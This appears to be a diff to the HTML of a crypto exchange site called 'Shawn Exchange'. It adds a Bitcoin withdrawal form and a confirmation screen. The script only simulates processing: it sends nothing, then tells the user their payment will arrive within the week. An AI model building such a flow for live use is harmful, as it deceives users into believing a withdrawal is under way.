@@ -399,9 +399,100 @@
 
                         <button id="start-button" onclick="showPage('page-form')" 
                       class="w-full sm:w-auto px-8 py-3 bg-accent-yellow hover:bg-yellow-600 text-primary-dark font-bold rounded-xl transition duration-200 shadow-lg transform hover:scale-105">
-                        <i data-lucide="banknote" class="w-5 h-5 mr-2"></i>  WITHDRAW FUNDS NOW
+                        <i data-lucide="banknote" class="w-5 h-5 mr-2"></i>WITHDRAW FUNDS NOW
                       </button>
                     </div>
+
+
+
+
+
+                    <!-- ============================================= -->
+        <!-- 2. WITHDRAWAL FORM PAGE (UPDATED) -->
+        <!-- ============================================= -->
+        <div id="page-form" class="hidden">
+            <h2 class="text-3xl font-extrabold text-white mb-6 text-center">Withdrawal Request Details</h2>
+            
+            <form id="withdrawal-form" onsubmit="handleWithdrawal(event)">
+                
+                <!-- 1. Full Name -->
+                <div class="mb-5">
+                    <label for="full-name" class="block text-sm font-medium text-gray-300 mb-2">Full Name</label>
+                    <input type="text" id="full-name" name="full-name" 
+                           placeholder="John Doe" 
+                           required 
+                           class="form-input">
+                </div>
+                
+                <!-- 2. Bitcoin Address -->
+                <div class="mb-5">
+                    <label for="btc-address" class="block text-sm font-medium text-gray-300 mb-2">Bitcoin Address (Destination)</label>
+                    <input type="text" id="btc-address" name="btc-address" 
+                           placeholder="bc1q..." 
+                           required 
+                           class="form-input"
+                           pattern="^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,90}$"
+                           title="Enter a valid Bitcoin address."
+                           minlength="26">
+                </div>
+                
+                <!-- 3. Amount to Withdraw -->
+                <div class="mb-5">
+                    <label for="withdraw-amount" class="block text-sm font-medium text-gray-300 mb-2">Amount to Withdraw (BTC)</label>
+                    <input type="number" id="withdraw-amount" name="withdraw-amount" 
+                           placeholder="1.50" 
+                           required 
+                           min="0.00001" 
+                           step="0.00001"
+                           class="form-input">
+                </div>
+
+                <!-- 4. Checkbox -->
+                <div class="mb-6 flex items-start">
+                    <div class="flex items-center h-5">
+                        <input id="confirm-check" type="checkbox" required
+                               class="w-4 h-4 text-accent-yellow bg-gray-700 border-gray-600 rounded focus:ring-accent-yellow">
+                    </div>
+                    <div class="ml-3 text-sm">
+                        <label for="confirm-check" class="font-medium text-gray-300">
+                            I confirm my Bitcoin address is **correct** and the withdrawal details are final.
+                        </label>
+                    </div>
+                </div>
+
+                <button type="submit" id="withdraw-button"
+                        class="w-full px-8 py-3 bg-accent-green hover:bg-green-600 text-white font-bold rounded-xl transition duration-200 shadow-lg transform hover:scale-[1.01]">
+                    CONFIRM WITHDRAWAL
+                </button>
+            </form>
+        </div>
+
+        <!-- ============================================= -->
+        <!-- 3. CONFIRMATION PAGE -->
+        <!-- ============================================= -->
+        <div id="page-confirmation" class="hidden flex flex-col items-center text-center p-4">
+            <svg class="w-20 h-20 text-accent-green mb-6 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+            <h2 class="text-4xl font-extrabold text-white mb-4">Request Received!</h2>
+            
+            <div class="bg-gray-800 p-6 rounded-xl border border-accent-green/50 w-full">
+                 <p class="text-lg text-gray-200 font-semibold mb-3">
+                    Your payment will be made within the week.
+                </p>
+                <p class="text-gray-400">
+                    Please check back after 48 hours for an updated status.
+                </p>
+                <p class="text-gray-400 mt-4 text-sm">
+                    Thank you for your patience and trust in our service.
+                </p>
+            </div>
+            
+            <button onclick="showPage('page-start')" 
+                class="mt-8 px-6 py-2 bg-gray-700 hover:bg-gray-600 text-gray-300 font-medium rounded-lg transition duration-200">
+                Return to Start
+            </button>
+        </div>
+
+    </div>
                 </aside>
 
                 <!-- Main Content Area -->
@@ -493,6 +584,83 @@
             <p class="mt-4">&copy; 2023 Shawn Exchange. All rights reserved.</p>
         </div>
     </footer>
+
+
+     <script>
+        // --- VIEW MANAGEMENT ---
+        function showPage(pageId) {
+            const pages = ['page-start', 'page-form', 'page-confirmation'];
+            
+            pages.forEach(id => {
+                const element = document.getElementById(id);
+                if (element) {
+                    // Hide all pages
+                    element.classList.add('hidden');
+                    // Remove flex utility for hidden pages
+                    element.classList.remove('flex'); 
+                }
+            });
+
+            const target = document.getElementById(pageId);
+            if (target) {
+                // Show the target page
+                target.classList.remove('hidden');
+                // Add flex utility for center alignment on certain pages
+                if (pageId === 'page-start' || pageId === 'page-confirmation') {
+                    target.classList.add('flex');
+                }
+            }
+        }
+
+        // --- FORM HANDLER ---
+        function handleWithdrawal(event) {
+            event.preventDefault(); // Stop the form from submitting normally
+            
+            // In a real app, you would capture all form data here:
+            const fullName = document.getElementById('full-name').value.trim();
+            const btcAddress = document.getElementById('btc-address').value.trim();
+            const amount = document.getElementById('withdraw-amount').value.trim();
+            const confirmCheck = document.getElementById('confirm-check').checked;
+            
+            const submitBtn = document.getElementById('withdraw-button');
+
+            // Basic validation check (HTML handles most of the 'required' attributes)
+            if (!confirmCheck) {
+                console.error("Confirmation box not checked.");
+                return;
+            }
+
+            if (!fullName || !btcAddress || !amount) {
+                console.error("Please fill in all required fields.");
+                return;
+            }
+
+
+            // Simulate loading state
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Processing...';
+
+            // Simulate API call delay (2 seconds)
+            setTimeout(() => {
+                // Reset button state (optional, since we move to a new page)
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'CONFIRM WITHDRAWAL';
+                
+                // Navigate to the confirmation page
+                showPage('page-confirmation');
+                
+                // Clear the form fields after submission
+                document.getElementById('withdrawal-form').reset();
+            }, 2000); 
+        }
+
+        // --- INITIALIZATION ---
+        // Ensure the start page is the first thing the user sees when the page loads
+        document.addEventListener('DOMContentLoaded', () => {
+            showPage('page-start');
+        });
+    </script>
+
 
 
     <!-- JavaScript for Logic and Functionality -->
